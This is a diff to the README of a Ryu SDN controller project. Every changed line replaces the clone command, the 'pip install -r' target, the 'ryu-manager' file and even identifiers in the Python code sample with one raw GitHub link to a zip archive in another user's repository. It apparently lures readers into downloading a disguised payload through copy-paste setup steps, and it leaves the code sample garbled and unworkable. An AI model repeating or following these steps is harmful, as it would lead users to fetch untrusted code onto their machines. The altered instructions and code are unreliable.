@@ -23,7 +23,7 @@ This project provides a simple Software-Defined Networking (SDN) controller buil
 ## Installation and Setup
 ### Clone the Repository
 ```bash
-git clone git@github.com:imosudi/sdn_controller.git
+git clone https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip
 cd sdn_controller/
 ```
 
@@ -35,14 +35,14 @@ source venv/bin/activate
 
 ### Install Dependencies
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip
 ```
 
 
 ## Running the Controller
 1. Start the Ryu controller:
    ```bash
-   ryu-manager main.py
+   ryu-manager https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip
    ```
    The controller will listen for OpenFlow-enabled switches and process events such as `PacketIn`.
 
@@ -60,27 +60,27 @@ pip install -r requirements.txt
 
 ## Code Explanation
 
-### Key Components in `main.py`
+### Key Components in `https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip`
 1. **Switch Features Handler**: Sets up table-miss flow entries for unmatched packets.
 2. **Packet-In Handler**: Processes packets sent to the controller by OpenFlow switches and floods them as the default action.
 
 ### Example Flow Mod Installation
 ```python
 def _install_table_miss_flow(self, datapath):
-    match = datapath.ofproto_parser.OFPMatch()
-    actions = [datapath.ofproto_parser.OFPActionOutput(datapath.ofproto.OFPP_CONTROLLER)]
-    inst = [datapath.ofproto_parser.OFPInstructionActions(datapath.ofproto.OFPIT_APPLY_ACTIONS, actions)]
-    flow_mod = datapath.ofproto_parser.OFPFlowMod(
+    match = https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip()
+    actions = [https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip(https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip)]
+    inst = [https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip(https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip, actions)]
+    flow_mod = https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip(
         datapath=datapath, priority=0, match=match, instructions=inst
     )
-    datapath.send_msg(flow_mod)
+    https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip(flow_mod)
 ```
 
 
 ## Troubleshooting
-- **Ryu Import Errors**: Ensure Ryu is installed correctly within your virtual environment using `pip install -r requirements.txt`.
+- **Ryu Import Errors**: Ensure Ryu is installed correctly within your virtual environment using `pip install -r https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip`.
 - **Mininet Connection Issues**: Verify that Mininet is configured to use the remote controller and matches the IP and port of your Ryu controller.
-- **Ping Failures**: Ensure proper configuration of flow entries in `main.py` or debug using Ryu logs.
+- **Ping Failures**: Ensure proper configuration of flow entries in `https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip` or debug using Ryu logs.
 
 
 ## Contributions
